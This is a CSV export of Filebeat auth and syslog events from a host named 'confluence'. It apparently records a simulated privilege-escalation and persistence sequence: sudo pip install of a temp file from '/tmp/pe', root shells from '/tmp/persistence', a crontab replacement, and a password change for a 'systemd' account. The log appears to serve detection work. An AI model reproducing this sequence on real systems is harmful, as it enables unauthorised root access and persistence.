"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","cloud.account.id","cloud.availability_zone","cloud.instance.id","cloud.instance.name","cloud.machine.type","cloud.project.id","cloud.provider","cloud.service.name","ecs.version","event.action","event.category","event.dataset","event.ingested","event.kind","event.module","event.outcome","event.timezone","event.type","fileset.name","group.id","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,"process.name","process.name.text","process.pid","related.hosts","related.ip","related.user","service.type","source.ip","source.port","system.auth.ssh.event","system.auth.ssh.method","system.auth.ssh.signature","system.auth.sudo.command","system.auth.sudo.pwd","system.auth.sudo.tty","system.auth.sudo.user","system.auth.useradd.home","system.auth.useradd.shell","user.effective.name","user.effective.name.text","user.id","user.name","user.name.text"
"Oct 26, 2022 @ 01:32:33.000","_2g0EIQBiYLzbw6ND906",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:38.071",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,575","pam_unix(chpasswd:chauthtok): password changed for systemd",chpasswd,chpasswd,3121972,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:32:33.000",AGg0EIQBiYLzbw6ND946,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:38.072",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,680","-",sudo,sudo,"-",confluence,"-","root, vagrant",system,"-","-","-","-","-","/bin/bash","/tmp/persistence",unknown,vagrant,"-","-",vagrant,vagrant,"-",root,root
"Oct 26, 2022 @ 01:32:33.000",Img0EIQBiYLzbw6NGt7s,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:32:41.067",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,237","(root) REPLACE (root)",crontab,crontab,3121981,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:32:33.000",I2g0EIQBiYLzbw6NIt7C,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:43.072",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,794","-",sudo,sudo,"-",confluence,"-",root,system,"-","-","-","-","-","/bin/bash","/tmp/persistence",unknown,root,"-","-",root,root,"-",root,root
"Oct 26, 2022 @ 01:32:15.000",pWgzEIQBiYLzbw6N6N0n,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:28.069",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","1,936","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/usr/local/bin/pip install /tmp/tmp.iSm64EMC4J","/tmp/pe",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:14.000",nWgzEIQBiYLzbw6N1N2g,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","ssh_login","authentication, session","system.auth","Oct 26, 2022 @ 01:32:23.069",event,system,success,"+00:00","authentication_success, info",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","1,664","-",sshd,sshd,3121463,confluence,"172.17.0.1",vagrant,system,"172.17.0.1",33720,Accepted,publickey,"RSA SHA256:17fXQ8i0ddiZcCMZ0uU5DpWnmzLlTTHqIzAmgz29qAU","-","-","-","-","-","-","-","-","-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:14.000",nmgzEIQBiYLzbw6N1N2g,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:23.070",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","1,825","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:31:54.000",HmgzEIQBiYLzbw6Nc90f,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","ssh_login","authentication, session","system.auth","Oct 26, 2022 @ 01:31:58.066",event,system,success,"+00:00","authentication_success, info",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","1,392","-",sshd,sshd,3120978,confluence,"172.17.0.1",vagrant,system,"172.17.0.1",44114,Accepted,publickey,"RSA SHA256:17fXQ8i0ddiZcCMZ0uU5DpWnmzLlTTHqIzAmgz29qAU","-","-","-","-","-","-","-","-","-",vagrant,vagrant
"Oct 26, 2022 @ 01:31:54.000",OGgzEIQBiYLzbw6Nht19,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:03.067",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","1,553","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:31:49.000",Q2gzEIQBiYLzbw6Nmt0A,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:32:08.063",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,067","message repeated 18 times: [ Audit daemon rotating log files]",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:30:55.000",YGgyEIQBiYLzbw6NnNwU,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:31:03.059",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","19,961","[164767.666248] virtio_balloon virtio2: Out of puff! Can't get 1 pages",kernel,kernel,"-",confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:30:54.000",RWgyEIQBiYLzbw6NiNyN,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:30:58.060",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","19,855","[164766.637516] virtio_balloon virtio2: Out of puff! Can't get 1 pages",kernel,kernel,"-",confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
